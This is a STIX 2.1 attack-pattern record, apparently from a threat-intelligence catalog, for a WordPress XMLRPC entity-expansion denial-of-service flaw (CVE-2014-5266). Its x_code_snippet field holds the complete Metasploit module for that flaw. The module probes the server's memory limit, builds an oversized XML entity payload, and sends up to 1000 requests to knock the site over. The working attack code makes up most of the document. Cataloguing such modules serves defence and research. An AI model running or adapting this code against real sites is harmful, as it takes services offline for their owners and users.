{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba3bd9c4-083b-4fb1-9122-f2cd549b69da",
    "created": "2024-08-14T16:26:18.95519Z",
    "modified": "2024-08-14T16:26:18.955195Z",
    "name": "Wordpress XMLRPC DoS",
    "description": " Wordpress XMLRPC parsing is vulnerable to a XML based denial of service. This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are also patched). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/wordpress_xmlrpc_dos.rb",
            "external_id": "wordpress_xmlrpc_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5266"
        },
        {
            "source_name": "reference",
            "url": "https://wordpress.org/news/2014/08/wordpress-3-9-2/"
        },
        {
            "source_name": "reference",
            "url": "http://www.breaksec.com/?p=6362"
        },
        {
            "source_name": "reference",
            "url": "https://mashable.com/archive/wordpress-xml-blowup-dos"
        },
        {
            "source_name": "reference",
            "url": "https://core.trac.wordpress.org/changeset/29404"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7526"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Wordpress XMLRPC DoS',\n      'Description'   => %q{\n        Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.\n        This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are\n        also patched).\n      },\n      'Author'        =>\n        [\n          'Nir Goldshlager',    # advisory\n          'Christian Mehlmauer' # metasploit module\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['CVE', '2014-5266'],\n          ['URL', 'https://wordpress.org/news/2014/08/wordpress-3-9-2/'],\n          ['URL', 'http://www.breaksec.com/?p=6362'],\n          ['URL', 'https://mashable.com/archive/wordpress-xml-blowup-dos'],\n          ['URL', 'https://core.trac.wordpress.org/changeset/29404'],\n          ['WPVDB', '7526']\n        ],\n      'DisclosureDate'=> '2014-08-06'\n    ))\n\n    register_options(\n    [\n      OptInt.new('RLIMIT', [ true, \"Number of requests to send\", 1000 ])\n    ])\n\n    register_advanced_options(\n    [\n      OptInt.new('FINGERPRINT_STEP', [true, \"The stepsize in MB when fingerprinting\", 8]),\n      OptInt.new('DEFAULT_LIMIT', [true, \"The default limit in MB\", 8])\n    ])\n  end\n\n  def rlimit\n    datastore['RLIMIT']\n  end\n\n  def default_limit\n    datastore['DEFAULT_LIMIT']\n  end\n\n  def fingerprint_step\n    datastore['FINGERPRINT_STEP']\n  end\n\n  def fingerprint\n    memory_to_use = fingerprint_step\n    # try out the available memory in steps\n    # apache will return a server error if the limit is reached\n    while memory_to_use < 1024\n      vprint_status(\"trying memory limit #{memory_to_use}MB\")\n      opts = {\n        'method'  => 'POST',\n        'uri'     => wordpress_url_xmlrpc,\n        'data'    => generate_xml(memory_to_use),\n        'ctype'   =>'text/xml'\n      }\n\n      begin\n        # low timeout because the server error is returned immediately\n        res = send_request_cgi(opts, timeout = 3)\n      rescue ::Rex::ConnectionError => exception\n        print_error(\"unable to connect: '#{exception.message}'\")\n        break\n      end\n\n      if res && res.code == 500\n        # limit reached, return last limit\n        last_limit = memory_to_use - fingerprint_step\n        vprint_status(\"got an error - using limit #{last_limit}MB\")\n        return last_limit\n      else\n        memory_to_use += fingerprint_step\n      end\n    end\n\n    # no limit can be determined\n    print_warning(\"can not determine limit, will use default of #{default_limit}\")\n    return default_limit\n  end\n\n  def generate_xml(size)\n    entity = Rex::Text.rand_text_alpha(3)\n    doctype = Rex::Text.rand_text_alpha(6)\n    param_value_1 = Rex::Text.rand_text_alpha(5)\n    param_value_2 = Rex::Text.rand_text_alpha(5)\n\n    size_bytes = size * 1024\n\n    # Wordpress only resolves one level of entities so we need\n    # to specify one long entity and reference it multiple times\n    xml = '<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>'\n    xml << \"<!DOCTYPE %{doctype} [\"\n    xml << \"<!ENTITY %{entity} \\\"%{entity_value}\\\">\"\n    xml << ']>'\n    xml << '<methodCall>'\n    xml << '<methodName>'\n    xml << \"%{payload}\"\n    xml << '</methodName>'\n    xml << '<params>'\n    xml << \"<param><value>%{param_value_1}</value></param>\"\n    xml << \"<param><value>%{param_value_2}</value></param>\"\n    xml << '</params>'\n    xml << '</methodCall>'\n\n    empty_xml = xml % {\n      :doctype => '',\n      :entity => '',\n      :entity_value => '',\n      :payload => '',\n      :param_value_1 => '',\n      :param_value_2 => ''\n    }\n\n    space_to_fill = size_bytes - empty_xml.size\n    vprint_status(\"max XML space to fill: #{space_to_fill} bytes\")\n\n    payload = \"&#{entity};\" * (space_to_fill / 6)\n    entity_value_length = space_to_fill - payload.length\n\n    payload_xml = xml % {\n      :doctype => doctype,\n      :entity => entity,\n      :entity_value => Rex::Text.rand_text_alpha(entity_value_length),\n      :payload => payload,\n      :param_value_1 => param_value_1,\n      :param_value_2 => param_value_2\n    }\n\n    payload_xml\n  end\n\n  def run\n    # get the max size\n    print_status(\"trying to fingerprint the maximum memory we could use\")\n    size = fingerprint\n    print_status(\"using #{size}MB as memory limit\")\n\n    # only generate once\n    xml = generate_xml(size)\n\n    for x in 1..rlimit\n      print_status(\"sending request ##{x}...\")\n      opts = {\n        'method'  => 'POST',\n        'uri'     => wordpress_url_xmlrpc,\n        'data'    => xml,\n        'ctype'   =>'text/xml'\n      }\n      begin\n        c = connect\n        r = c.request_cgi(opts)\n        c.send_request(r)\n        # Don't wait for a response, can take very long\n      rescue ::Rex::ConnectionError => exception\n        print_error(\"unable to connect: '#{exception.message}'\")\n        return\n      ensure\n        disconnect(c) if c\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-06"
}